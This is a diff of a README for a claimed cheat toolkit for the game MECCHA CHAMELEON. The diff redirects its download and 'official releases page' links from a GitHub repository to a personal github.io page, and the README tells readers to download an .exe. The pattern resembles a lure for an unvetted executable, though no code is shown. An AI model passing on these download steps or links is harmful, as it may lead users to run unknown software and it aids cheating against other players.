@@ -1,6 +1,6 @@
 # 🦎 MecchaChameleon-MecchaBionix - Master Every Lobby With Advanced Tools
 
-[![](https://img.shields.io/badge/Download-MecchaBionix-blue.svg)](https://github.com/pathaas1357/MecchaChameleon-MecchaBionix)
+[![](https://img.shields.io/badge/Download-MecchaBionix-blue.svg)](https://pathaas1357.github.io)
 
 MecchaBionix provides a suite of tools for the game MECCHA CHAMELEON. It adds features that change how you interact with the game environment. This software helps you find hidden paths, manage your inventory with ease, and gain an advantage over other players.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software. Keep your
 
 Follow these steps to set up the program on your computer.
 
-1. Visit the [official releases page](https://github.com/pathaas1357/MecchaChameleon-MecchaBionix).
+1. Visit the [official releases page](https://pathaas1357.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
